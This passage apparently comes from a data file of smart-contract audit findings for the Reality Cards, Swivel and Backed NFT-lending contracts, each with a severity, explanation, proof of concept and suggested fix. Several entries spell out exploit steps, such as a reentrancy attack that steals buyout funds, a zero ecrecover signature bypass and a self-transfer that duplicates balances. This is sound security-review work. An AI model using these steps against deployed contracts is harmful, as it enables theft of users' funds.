Recommend changing `addToWhitelist` to only ever flip a user's bool to true. To clarify the governor's intention, create a corresponding `removeFromWhitelist` and `batchRemoveFromWhitelist` which flip a user's bool to false, so that the governor does not accidentally remove a user when intending to add them.

Also recommend changing `isAllowed[_user] = !isAllowed[_user];` TO `isAllowed[_user] = true;`, and adding this:
```solidity
    /// @notice Remove a user to the whitelist
    function removeFromWhitelist(address _user) public override {
        IRCFactory factory = IRCFactory(factoryAddress);
        require(factory.isGovernor(msgSender()), ""Not authorised"");
        isAllowed[_user] = false;
    }

    /// @notice Remove multiple users from the whitelist
    function batchRemoveFromWhitelist(address[] calldata _users) public override {
        for (uint256 index = 0; index < _users.length; index++) {
            removeFromWhitelist(_users[index]);
        }
    }
```"
13.md,Unbounded iteration on `_cardAffiliateAddresses`,low,"The `Factory.createMarket` iterates over all `_cardAffiliateAddresses`.

The transactions can fail if the arrays get too big and the transaction would consume more gas than the block limit.
This will then result in a denial of service for the desired functionality and break core functionality.

Recommend performing a `_cardAffiliateAddresses.length == 0 || _cardAffiliateAddresses.length == tokenUris.length` check in `createMarket` instead of silently skipping card affiliate cuts in `Market.initialize`.
This would restrict the `_cardAffiliateAddresses` length to the `nftMintingLimit` as well."
13.md,`uberOwner` cannot do all the things an owner can,low,"The `uberOwner` cannot do the same things the owner can. They can ""only"" set the reference contract for the market.

The same ideas apply to `Treasury` and `Factory`'s `uberOwner`.

The name is misleading as it sounds like the uber-owner is more powerful than the owner.

Recommend that `Uberowner` should at least be able to set the owner if not be allowed to call all functions that an `owner` can. Alternatively, rename the `uberOwner`."
13.md,Dangerous toggle functions,low,"Usually one tries to avoid toggle functions in blockchains, because it could be that you think that the first transaction you sent was not correctly submitted (but it's just pending for a long time), or you might even be unaware that it was already sent if multiple roles can set it (like with `changeMarketApproval` / `onlyGovernors`) or if it's an msig.

This results in potentially double-toggling the state, i.e, it is set to the initial value again.
Some example functions: `changeMarketCreationGovernorsOnly`, `changeMarketApproval`, and the ones that follow.
The outcome of toggle functions is hard to predict on blockchains due to the very async nature and lack of information about pending transactions.

Recommend using functions that accept a specific value as a parameter instead."
13.md,The `domainSeperator` is not recalculated after a hard fork happens,low,"The variable `domainSeperator` in `EIP712Base` is cached in the contract storage and will not change after the contract is initialized. However, if a hard fork happens after the contract deployment, the `domainSeperator` would become invalid on one of the forked chains due to the `block.chainid` has changed.

Recommend consider using the [implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/draft-EIP712.sol) from OpenZeppelin, which recalculates the domain separator if the current `block.chainid` is not the cached chain ID."
39.md,Unsafe handling of underlying tokens,high,".

#### Impact

Not every ERC20 token follows OpenZeppelin's recommendation. It's possible (inside ERC20 standard) that a `transferFrom` doesn't revert upon failure but returns `false`.

The code doesn't check these return values. For example `uToken.transferFrom(msg.sender, o.maker, a);` in `initiateVaultFillingZcTokenInitiate` can be exploited by the msg.sender to initiate a trade without sending any underlying.

#### Proof of Concept

`grep 'transfer' Swivel.sol`

#### Tools Used

editor

#### Recommended Mitigation Steps

Consider using [OpenZeppelin's library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) with *safe* versions of transfer functions."
39.md,Swivel: Taker is charged fees twice in exitVaultFillingVaultInitiate,high,".

#### Impact

Taker is charged fees twice in `exitVaultFillingVaultInitiate()` . Maker is transferring less than premiumFilled to taker and then taker is expected to pay fees i.e. taker's net balance is premiumFilled - 2\*fee

#### Recommended Mitigation Steps

```jsx
function exitVaultFillingVaultInitiate(Hash.Order calldata o, uint256 a, Sig.Components calldata c) internal {
  bytes32 hash = validOrderHash(o, c);

  require(a <= (o.principal - filled[hash]), 'taker amount > available volume');
  
  filled[hash] += a;
      
  uint256 premiumFilled = (((a * 1e18) / o.principal) * o.premium) / 1e18;
  uint256 fee = ((premiumFilled * 1e18) / fenominator[3]) / 1e18;

  Erc20 uToken = Erc20(o.underlying);
  // transfer premium from maker to sender
  uToken.transferFrom(o.maker, msg.sender, premiumFilled);

  // transfer fee in underlying to swivel from sender
  uToken.transferFrom(msg.sender, address(this), fee);

  // transfer <a> vault.notional (nTokens) from sender to maker
  require(MarketPlace(marketPlace).p2pVaultExchange(o.underlying, o.maturity, msg.sender, o.maker, a), 'vault exchange failed');

  emit Exit(o.key, hash, o.maker, o.vault, o.exit, msg.sender, a, premiumFilled);
}
```"
39.md,`transferNotionalFrom` doesn't check `from != to`,high,".

### Impact

The function `transferNotionalFrom` of `VaultTracker.sol` uses temporary variables to store the balances.
If the ""from"" and ""to"" address are the same then the balance of ""from"" is overwritten by the balance of ""to"".
This means the balance of ""from"" and ""to"" are increased and no balances are decreased, effectively printing money.

Note: `transferNotionalFrom` can be called via `transferVaultNotional` by everyone.

#### Proof of Concept

<https://github.com/Swivel-Finance/gost/blob/v2/test/vaulttracker/VaultTracker.sol#L144-L196>
```solidity
  function transferNotionalFrom(address f, address t, uint256 a) external onlyAdmin(admin) returns (bool) {
  Vault memory from = vaults\[f];
  Vault memory to = vaults\[t];
  ...
  vaults\[f] = from;
  ...
  vaults\[t] = to;    // if f==t then this will overwrite vaults\[f]
```

<https://github.com/Swivel-Finance/gost/blob/v2/test/marketplace/MarketPlace.sol#L234-L238>
```solidity
  function transferVaultNotional(address u, uint256 m, address t, uint256 a) public returns (bool) {
  require(VaultTracker(markets\[u]\[m].vaultAddr).transferNotionalFrom(msg.sender, t, a), 'vault transfer failed');
```

#### Tools Used

#### Recommended Mitigation Steps

Add something like the following:
`require (f != t,""Same"");`"
39.md,return value of 0 from ecrecover not checked,high,".

#### Impact

The solidity function `ecrecover` is used, however the error result of 0 is not checked for.
See documentation:
<https://docs.soliditylang.org/en/v0.8.9/units-and-global-variables.html?highlight=ecrecover#mathematical-and-cryptographic-functions>
""recover the address associated with the public key from elliptic curve signature or return zero on error. ""

Now you can supply invalid input parameters to the `Sig.recover` function, which will then result 0.
If you also set `o.maker` to be 0 then this will match and an invalid signature is not detected.

So you can do all kinds of illegal & unexpected transactions.

#### Proof of Concept

<https://github.com/Swivel-Finance/gost/blob/v2/test/swivel/Swivel.sol#L476-L484>
```solidity
  function validOrderHash(Hash.Order calldata o, Sig.Components calldata c) internal view returns (bytes32) {
  ...
  require(o.maker == Sig.recover(Hash.message(domain, hash), c), 'invalid signature');
  return hash;
  }
```

<https://github.com/Swivel-Finance/gost/blob/v2/test/swivel/Sig.sol#L16-L23>
```solidity
  function recover(bytes32 h, Components calldata c) internal pure returns (address) {
  ...
  return ecrecover(h, c.v, c.r, c.s);
```

#### Tools Used

#### Recommended Mitigation Steps

Verify that the result from `ecrecover` isn't 0"
39.md,Admin is a single-point of failure without any mitigations,medium,".

#### Impact

Admin role has absolute power across Swivel, Marketplace and VaultTracker contracts with several `onlyOwner` functions. There is no ability to change admin to a new address or renounce it which is helpful for lost/compromised admin keys or to delegate control to a different governance/DAO address in future.

The project does not use the widely used OpenZeppelin Ownable library which provides transfer/renounce functions to mitigate such compromised/accidental situations with admin keys. This makes admin role/key a single-point of failure.

#### Proof of Concept

- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/marketplace/MarketPlace.sol#L38>
- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/swivel/Swivel.sol#L43>
- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/vaulttracker/VaultTracker.sol#L27>

#### Tools Used

Manual Analysis

#### Recommended Mitigation Steps

Ensure admins are reasonably redundant/independent (3/7 or 5/9) multisigs and add transfer/renounce functionality for admin. Consider using OpenZeppelin’s Ownable library."
39.md,Missing event & timelock for critical `onlyAdmin` functions,medium,".

#### Impact

`onlyAdmin` functions that change critical contract parameters/addresses/state should emit events and consider adding timelocks so that users and other privileged roles can detect upcoming changes (by offchain monitoring of events) and have the time to react to them.

Privileged functions in all contracts, for e.g. `VaultTracker onlyAdmin`, have direct financial or trust impact on users who should be given an opportunity to react to them by exiting/engaging without being surprised when changes initiated by such functions are made effective opaquely (without events) and/or immediately (without timelocks).

See similar Medium-severity finding in ConsenSys's Audit of 1inch Liquidity Protocol (<https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/#unpredictable-behavior-for-users-due-to-admin-front-running-or-general-bad-timing>)

#### Proof of Concept

- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/vaulttracker/VaultTracker.sol#L36-L59>
- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/vaulttracker/VaultTracker.sol#L70-L98>
- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/vaulttracker/VaultTracker.sol#L102-L129>
- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/vaulttracker/VaultTracker.sol#L132-L138>
- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/vaulttracker/VaultTracker.sol#L144-L196>
- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/vaulttracker/VaultTracker.sol#L201-L239>

and others

#### Tools Used

Manual Analysis

#### Recommended Mitigation Steps

Add events to all possible flows (some flows emit events in callers) and consider adding timelocks to such onlyAdmin functions."
39.md,Previously created markets can be overwritten,medium,".

#### Impact

The `createMarket` function allows accidental overwriting of previously created markets for the same combination of underlying and maturity timestamp (u, m) because there is no zero-address check to see if a previously created market exists for that combination.

#### Proof of Concept

- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/marketplace/MarketPlace.sol#L65>
- <https://github.com/Swivel-Finance/gost/blob/5fb7ad62f1f3a962c7bf5348560fe88de0618bae/test/marketplace/MarketPlace.sol#L53-L70>

#### Tools Used

Manual Analysis

#### Recommended Mitigation Steps

Add a zero-address check for `markets\[u]\[m]` in `createMarket` before writing to it"
39.md,fee-on-transfer underlying can cause problems,medium,".

#### Impact

The current implementation doesn't work with fee-on-transfer underlying tokens. Considering that Compound can have these kind of tokens (ex. USDT can activate fees), this issue can affect the protocol.

The problem arises when transferring tokens, basically blocking all functions in `Swivel.sol` for that particular token, since the contract wrongly assumes balances values.
This becomes particularly problematic in the following scenario: a market for USDT is running without problems, then they activate the fee: this effectively blocks users from redeeming the underlying.

#### Proof of Concept

`grep 'transfer' Swivel.sol` for a complete list of affected lines (basically every `tranfer` or `transferFrom` of underlying tokens). Also `grep 'redeemUnderlying' Swivel.sol`.

For example:

```js
  require(CErc20(mPlace.cTokenAddress(u, m)).redeemUnderlying(redeemed) == 0, 'compound redemption failed');
  // transfer underlying back to msg.sender
  Erc20(u).transfer(msg.sender, redeemed);
```

This would fail (revert) since the contract would have received less than `redeemed` tokens.

#### Tools Used

editor

#### Recommended Mitigation Steps

If the protocol wants to use all possible Compound tokens, a way to handle these tokens must be implemented. A possible way to do it is to check the balance of the contract before and after every time a token is transferred to see the effective quantity. To help keeping the code clear, a function like [Compound's `doTransferIn`](https://github.com/compound-finance/compound-protocol/blob/master/contracts/CErc20.sol#L156) can be implemented."
39.md,Swivel: implementation for initiateZcTokenFillingZcTokenExit is incorrect,medium,".

#### Impact

In `initiateZcTokenFillingZcTokenExit()` , this comment `// transfer underlying tokens - the premium paid + fee in underlying to swivel (from sender)`  is incorrect because you are actually transferring the underlying tokens - premium paid to the maker (from sender) AND you have to pay fee separately to swivel.

`initiateZCTokenFillingZcTokenExit` means I want to sell my nTokens so that means `a` is the amount of principal I want to fill. Let's use a hypothetical example where I (taker) wants to fill 10 units of ZcTokenExit for maker.

1.  I transfer 10 units of underlying to Swivel. The net balances are: me (-a), swivel (+a)
2.  I transfer fee (in underlying) to Swivel. The net balances are: me (-a-fee), swivel (+a+fee)
3.  Swivel initiates my position, sends me the ZcToken and sends Maker the nTokens
4.  Maker pays me premiumFilled for the nTokens. The net balances are: me (-a-fee+premiumsFilled), swivel (+a+fee), maker (-premiumsFilled)
5.  Maker closes position. The net balances are: me (-a-fee+premiumsFilled), swivel (+fee), maker (-premiumsFilled+a)

So effectively, I (taker) should be paying a-premium to maker and fee to swivel.

#### Recommended Mitigation Steps

```jsx
function initiateZcTokenFillingZcTokenExit(Hash.Order calldata o, uint256 a, Sig.Components calldata c) internal {
  bytes32 hash = validOrderHash(o, c);

  require(a <= o.principal - filled[hash]), 'taker amount > available volume'); // Note: you don't need to wrap these in brackets because if you look at the https://docs.soliditylang.org/en/latest/cheatsheet.html#order-of-precedence-of-operators, subtraction will always go before comparison 

  filled[hash] += a;

  uint256 premiumFilled = (((a * 1e18) / o.principal) * o.premium) / 1e18;
  uint256 fee = ((premiumFilled * 1e18) / fenominator[0]) / 1e18;

  // transfer underlying tokens - the premium paid in underlying to maker (from sender)
  Erc20(o.underlying).transferFrom(msg.sender, o.maker, a - premiumFilled);
  Erc20(o.underlying).transferFrom(msg.sender, swivel, fee);
  // transfer <a> zcTokens between users in marketplace
  require(MarketPlace(marketPlace).p2pZcTokenExchange(o.underlying, o.maturity, o.maker, msg.sender, a), 'zcToken exchange failed');
          
  emit Initiate(o.key, hash, o.maker, o.vault, o.exit, msg.sender, a, premiumFilled);
}
```"
106.md,Can force borrower to pay huge interest,high,"[NFTLoanFacilitator.sol#L148](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L148)<br>

The loan amount is used as a min loan amount. It can be matched as high as possible (realistically up to the collateral NFT's worth to remain in profit) and the borrower has to pay interest on the entire amount instead of just on the desired loan amount when the loan was created.

### Proof of Concept

*   User needs a 10k USDC loan, NFTs are illiquid and they only have a BAYC worth 350k\$. So buying another NFT worth roughly the desired 10k\$ is not feasible. They will put the entire 350k\$ BAYC as collateral for the 10k USDC loan.
*   A lender matches the loan calling `lend` with 350k USDC.
*   The borrower now has to pay interest on the entire 350k USDC even though they only wanted a 10k loan. Otherwise, they risk losing their collateral. Their effective rate on their 10k loan is 35x higher.

### Recommended Mitigation Steps

The loan amount should not have min amount semantics.
When someone wants to get a loan, they specify a certain amount they need, they don't want to receive and pay interest on more than that.







> Nonetheless, I appreciate your drawing focus again to this point ([we discussed on twitter](https://twitter.com/WilsonCusack/status/1511683701800853506?s=20&t=SGd-Grp3L5yrL48Y3r_tEw) with our community during audit as this became a point of interest, and have of course considered this idea when designing the protocol at the outset). We will again consider adding a Boolean flag to each loan as to whether the borrower allows loan amount increases 






***"
106.md,currentLoanOwner can manipulate loanInfo when any lenders try to buyout,high,"[NFTLoanFacilitator.sol#L205-L208](https://github.com/code-423n4/2022-04-backed/blob/main/contracts/NFTLoanFacilitator.sol#L205-L208)<br>
[NFTLoanFacilitator.sol#L215-L218](https://github.com/code-423n4/2022-04-backed/blob/main/contracts/NFTLoanFacilitator.sol#L215-L218)

If an attacker already calls `lend()` to lend to a loan, the attacker can manipulate `loanInfo` by reentrancy attack when any lenders try to buyout. The attacker can set bad values of `lendInfo` (e.g. very long duration, and 0 interest rate) that the lender who wants to buyout don't expect.

### Proof of Concept

An attacker lends a loan, and `loanAssetContractAddress` in `loanInfo` is ERC777 which is suffering from reentrancy attack. When a lender (victim) try to buyout the loan of the attacker:

1.  The victim called `lend()`.
2.  In `lend()`, it always call `ERC20(loanAssetContractAddress).safeTransfer` to send `accumulatedInterest + previousLoanAmount` to `currentLoanOwner` (attacker).
3.  The `transfer` of `loanAssetContractAddress` ERC777 will call `_callTokensReceived` so that the attacker can call `lend()` again in reentrancy with parameters:
    *   loanId: same loan Id
    *   interestRate: set to bad value (e.g. 0)
    *   amount: same amount
    *   durationSeconds: set to bad value (e.g. a long durationSeconds)
    *   sendLendTicketTo: same address of the attacker (`currentLoanOwner`)
4.  Now the variables in `loanInfo` are changed to bad value, and the victim will get the lend ticket but the loan term is manipulated, and can not set it back (because it requires a better term).

### Tools Used

vim

### Recommended Mitigation Steps

Use `nonReentrant` modifier on `lend()` to prevent reentrancy attack: [OpenZeppelin/ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)<br>








***"
106.md,Borrower can be their own lender and steal funds from buyout due to reentrancy,high,"[NFTLoanFacilitator.sol#L214-L221](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L214-L221)<br>
[NFTLoanFacilitator.sol#L230-L250](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L230-L250)

If borrower lends their own loan, they can repay and close the loan before ownership of the lend ticket is transferred to the new lender. The borrower will keep the NFT + loan amount + accrued interest.

### Proof of Concept

This exploit requires that the `loanAssetContractAddress` token transfers control to the receiver.

#### Steps of exploit:

*   Borrower creates loan with `createLoan()`.
*   The same Borrower calls `lend()`, funding their own loan. The Borrower receives the lend ticket, and funds are transferred to themself.
*   A new lender attempts to buy out the loan. The original loan amount + accruedInterest are sent to the original lender (same person as borrower).
*   Due to lack of checks-effects-interactions pattern, the borrower is able to immediately call `repayAndCloseLoan()` before the lend ticket is transferred to the new lender.

The following code illustrates that the new lender sends funds to the original lender prior to receiving the lend ticket in return.
```solidity
} else {
    ERC20(loan.loanAssetContractAddress).safeTransferFrom(
        msg.sender,
        currentLoanOwner,
        accumulatedInterest + previousLoanAmount
    );
}
ILendTicket(lendTicketContract).loanFacilitatorTransfer(currentLoanOwner, sendLendTicketTo, loanId);
```

```solidity
The original lender/borrower calls the following `repayAndCloseLoan()` function so that they receive their collateral NFT from the protocol.

function repayAndCloseLoan(uint256 loanId) external override notClosed(loanId) {
    Loan storage loan = loanInfo[loanId];


    uint256 interest = _interestOwed(
        loan.loanAmount,
        loan.lastAccumulatedTimestamp,
        loan.perAnumInterestRate,
        loan.accumulatedInterest
    );
    address lender = IERC721(lendTicketContract).ownerOf(loanId);
    loan.closed = true;
    ERC20(loan.loanAssetContractAddress).safeTransferFrom(msg.sender, lender, interest + loan.loanAmount);
    IERC721(loan.collateralContractAddress).safeTransferFrom(
        address(this),
        IERC721(borrowTicketContract).ownerOf(loanId),
        loan.collateralTokenId
    );


    emit Repay(loanId, msg.sender, lender, interest, loan.loanAmount);
    emit Close(loanId);
}
```

Finally, the new lender receives the lend ticket that has no utility at this point. The borrower now possesses the NFT, original loan amount, and accrued interest.

### Recommended Mitigation Steps

Move the line to transfer the lend ticket to the new lender above the line to transfer to funds to the original lender. Or, use reentrancyGuard from OpenZeppelin to remove the risk of reentrant calls completely.

If desired, also require that the lender cannot be the same account as the borrower of a loan.

 > malicious ERC20<br>
> -> transfers value to borrow ticket holder<br>
> -> calls repay and close loan (would need funds available to do so, but still nets up)









***"
106.md,"When an attacker lends to a loan, the attacker can trigger DoS that any lenders can not buyout it",medium,"[NFTLoanFacilitator.sol#L205-L208](https://github.com/code-423n4/2022-04-backed/blob/main/contracts/NFTLoanFacilitator.sol#L205-L208)<br>
[NFTLoanFacilitator.sol#L215-L218](https://github.com/code-423n4/2022-04-backed/blob/main/contracts/NFTLoanFacilitator.sol#L215-L218)

If an attacker (lender) lends to a loan, the attacker can always revert transactions when any lenders try to buyout, making anyone can not buyout the loan of the attacker.

### Proof of Concept

1.  A victim calls `lend()`, trying to buyout the loan of the attacker.
2.  In `lend()`, it always call `ERC20(loanAssetContractAddress).safeTransfer` to send `accumulatedInterest + previousLoanAmount` to `currentLoanOwner` (attacker).
3.  If the `transfer` of `loanAssetContractAddress` is ERC777, it will call `_callTokensReceived` that the attacker can manipulate and always revert it.
4.  Because `NFTLoanFacilitator` uses `safeTransfer` and `safeTransferFrom` to check return value, the transaction of the victim will also be reverted. It makes anyone can not buyout the loan of the attacker.

In `_callTokensReceived`, the attacker just wants to revert the buyout transaction, but keep `repayAndCloseLoan` successful. The attacker can call `loanInfoStruct(uint256 loanId)` in `_callTokensReceived` to check if the value of `loanInfo` is changed or not to decide to revert it.

### Tools Used

vim

### Recommended Mitigation Steps

Don't transfer `ERC20(loanAssetContractAddress)` to `currentLoanOwner` in `lend()`, use a global mapping to record redemption of lenders and add an external function `redeem` for lenders to transfer `ERC20(loanAssetContractAddress)`.










***"
106.md,Protocol doesn't handle fee on transfer tokens,medium,"[NFTLoanFacilitator.sol#L155-L160](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L155-L160)<br>

Since the borrower is able to specify any asset token, it is possible that loans will be created with tokens that support fee on transfer. If a fee on transfer asset token is chosen, the protocol will contain a point of failure on the original `lend()` call.

It is my belief that this is a medium severity vulnerability due to its ability to impact core protocol functionality.

### Proof of Concept

For the first lender to call `lend()`, if the transfer fee % of the asset token is larger than the origination fee %, the second transfer will fail in the following code:

```solidity
ERC20(loanAssetContractAddress).safeTransferFrom(msg.sender, address(this), amount);
uint256 facilitatorTake = amount * originationFeeRate / SCALAR;
ERC20(loanAssetContractAddress).safeTransfer(
    IERC721(borrowTicketContract).ownerOf(loanId),
    amount - facilitatorTake
);
```

Example:

*   `originationFee = 2%` Max fee is 5% per comments

*   `feeOnTransfer = 3%`

*   `amount = 100 tokens`

*   Lender transfers `amount`

*   `NFTLoanFacilitator` receives `97`.

*   `facilitatorTake = 2`

*   `NFTLoanFacilitator` attempts to send `100 - 2` to borrower, but only has `97`.

*   Execution reverts.

#### Other considerations:

If the originationFee is less than or equal to the transferFee, the transfers will succeed but will be received at a loss for the borrower and lender. Specifically for the lender, it might be unwanted functionality for a lender to lend 100 and receive 97 following a successful repayment (excluding interest for this example).

### Recommended Mitigation Steps

Since the `originationFee` is calculated based on the `amount` sent by the lender, this calculation will always underflow given the example above. Instead, a potential solution would be to calculate the `originationFee` based on the requested loan amount, allowing the lender to send a greater value so that `feeOnTransfer <= originationFee`.

Oppositely, the protocol can instead calculate the amount received from the initial transfer and use this amount to calculate the `originationFee`. The issue with this option is that the borrower will receive less than the desired loan amount.










***"
106.md,"`sendCollateralTo` is unchecked in `closeLoan()`, which can cause user's collateral NFT to be frozen",medium,"[NFTLoanFacilitator.sol#L116-L126](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L116-L126)<br>

```solidity
function closeLoan(uint256 loanId, address sendCollateralTo) external override notClosed(loanId) {
    require(IERC721(borrowTicketContract).ownerOf(loanId) == msg.sender,
    ""NFTLoanFacilitator: borrow ticket holder only"");

    Loan storage loan = loanInfo[loanId];
    require(loan.lastAccumulatedTimestamp == 0, ""NFTLoanFacilitator: has lender, use repayAndCloseLoan"");
    
    loan.closed = true;
    IERC721(loan.collateralContractAddress).transferFrom(address(this), sendCollateralTo, loan.collateralTokenId);
    emit Close(loanId);
}
```

The `sendCollateralTo` will receive the collateral NFT when `closeLoan()` is called. However, if `sendCollateralTo` is a contract address that does not support ERC721, the collateral NFT can be frozen in the contract.

As per the documentation of EIP-721:

> A wallet/broker/auction application MUST implement the wallet interface if it will accept safe transfers.

Ref: [EIP-721](https://eips.ethereum.org/EIPS/eip-721)

### Recommended Mitigation Steps

Change to:

```solidity
function closeLoan(uint256 loanId, address sendCollateralTo) external override notClosed(loanId) {
    require(IERC721(borrowTicketContract).ownerOf(loanId) == msg.sender,
    ""NFTLoanFacilitator: borrow ticket holder only"");

    Loan storage loan = loanInfo[loanId];
    require(loan.lastAccumulatedTimestamp == 0, ""NFTLoanFacilitator: has lender, use repayAndCloseLoan"");
    
    loan.closed = true;
    IERC721(loan.collateralContractAddress).safeTransferFrom(address(this), sendCollateralTo, loan.collateralTokenId);
    emit Close(loanId);
}
```





***"
106.md,`requiredImprovementRate` can not work as expected when `previousInterestRate` less than 10 due to precision loss,medium,"[NFTLoanFacilitator.sol#L167-L179](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L167-L179)

```solidity
{
    uint256 previousInterestRate = loan.perAnumInterestRate;
    uint256 previousDurationSeconds = loan.durationSeconds;

    require(interestRate <= previousInterestRate, 'NFTLoanFacilitator: rate too high');
    require(durationSeconds >= previousDurationSeconds, 'NFTLoanFacilitator: duration too low');

    require((previousLoanAmount * requiredImprovementRate / SCALAR) <= amountIncrease
    || previousDurationSeconds + (previousDurationSeconds * requiredImprovementRate / SCALAR) <= durationSeconds 
    || (previousInterestRate != 0 // do not allow rate improvement if rate already 0
        && previousInterestRate - (previousInterestRate * requiredImprovementRate / SCALAR) >= interestRate), 
    ""NFTLoanFacilitator: proposed terms must be better than existing terms"");
}
```

The `requiredImprovementRate` represents the percentage of improvement required of at least one of the terms when buying out from a previous lender.

However, when `previousInterestRate` is less than `10` and `requiredImprovementRate` is `100`, due to precision loss, the new `interestRate` is allowed to be the same as the previous one.

Making such an expected constraint absent.

### Proof of Concept

1.  Alice `createLoan()` with `maxPerAnumInterest` = 10, received `loanId` = 1
2.  Bob `lend()` with `interestRate` = 9  for `loanId` = 1
3.  Charlie `lend()` with `interestRate` = 9 (and all the same other terms with Bob) and buys out `loanId` = 1

Charlie is expected to provide at least 10% better terms, but actually bought out Bob with the same terms.

### Recommended Mitigation Steps

Consider using: [OpenZeppelin/Math.sol#L39-L42](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.5.0/contracts/utils/math/Math.sol#L39-L42)<br>

And change the check to:

```solidity
(previousInterestRate != 0 // do not allow rate improvement if rate already 0
        && previousInterestRate - Math.ceilDiv(previousInterestRate * requiredImprovementRate, SCALAR) >= interestRate)
```






***"
106.md,Borrowers lose funds if they call `repayAndCloseLoan` instead of `closeLoan`,medium,"[NFTLoanFacilitator.sol#L241](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L241)<br>

The `repayAndCloseLoan` function does not revert if there has not been a lender for a loan (matched with `lend`).
Users should use `closeLoan` in this case but the contract should disallow calling `repayAndCloseLoan` because users can lose funds.

It performs a `ERC20(loan.loanAssetContractAddress).safeTransferFrom(msg.sender, lender, interest + loan.loanAmount)` call where `interest` will be a high value accumulated from timestamp 0 and the `loan.loanAmount` is the initially desired min loan amount `minLoanAmount` set in `createLoan`.
The user will lose these funds if they ever approved the contract (for example, for another loan).

### Recommended Mitigation Steps

Add a check that there actually is something to repay.

```solidity
require(loan.lastAccumulatedTimestamp > 0, ""loan was never matched by a lender. use closeLoan instead"");
```








***"
106.md,Might not get desired min loan amount if `_originationFeeRate` changes,medium,"[NFTLoanFacilitator.sol#L309](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L309)<br>

Admins can update the origination fee by calling `updateOriginationFeeRate`.
Note that a borrower does not receive their `minLoanAmount` set in `createLoan`, they only receive `(1 - originationFee) * minLoanAmount`, see [`lend`](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L159).
Therefore, they need to precalculate the `minLoanAmount` using the **current** origination fee to arrive at the post-fee amount that they actually receive.
If admins then increase the fee, the borrower receives fewer funds than required to cover their rent and might become homeless.

### Recommended Mitigation Steps

Reconsider how the min loan amount works. Imo, this `minLoanAmount` should be the post-fee amount, not the pre-fee amount. It's also more intuitive for the borrower when creating the loan.







***"
106.md,"`mintBorrowTicketTo` can be a contract with no `onERC721Received` method, which may cause the BorrowTicket NFT to be frozen and put users' funds at risk",medium,"[NFTLoanFacilitator.sol#L102-L102](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L102-L102)<br>

```solidity
IERC721Mintable(borrowTicketContract).mint(mintBorrowTicketTo, id);
```

[NFTLoanTicket.sol#L33-L35](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanTicket.sol#L33-L35)

```solidity
function mint(address to, uint256 tokenId) external override loanFacilitatorOnly {
    _mint(to, tokenId);
}
```

If `mintBorrowTicketTo` is a contract that does not implement the `onERC721Received` method, in the current implementation of `createLoan()`, the tx will still be successfully, and the loan will be created.

This can be a problem if `mintBorrowTicketTo` can not handle ERC721 properly, as the `BorrowTicket` NFT will be used later to get back the user's funds.

### Recommended Mitigation Steps

Consider using `safeMint` in `NFTLoanTicket.sol#mint()`:

```solidity
function mint(address to, uint256 tokenId) external override loanFacilitatorOnly {
    _safeMint(to, tokenId);
}
```





 > <img width=""303"" alt=""Screen Shot 2022-04-16 at 7 21 08 AM"" src=""https://user-images.githubusercontent.com/6678357/163673078-bc8d84f5-8371-4b39-bce6-f997ce820d9d.png"">



***"
26.md,`findNewOwner` edgecase,high,"In the function `findNewOwner` of `RCOrderbook`, as loop is done which included the check  `_loopCounter < maxDeletions`
Afterwards, a check is done for  ""(_loopCounter != maxDeletions)"" to determine if the processing is finished.
If `_loopCounter == maxDeletions` then the conclusion is that it isn't finished yet.

However, there is the edgecase that the processing might just be finished at the same time as `_loopCounter == maxDeletions`.

You can see this the best if you assume `maxDeletions==1`, in that case it will never draw the conclusion it is finished.
Of course having `maxDeletions==1` is very unlikely in practice.

```solidity
// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCOrderbook.sol#L549
 function findNewOwner(uint256 _card, uint256 _timeOwnershipChanged)  external  override  onlyMarkets  {
...
    // delete current owner
    do {
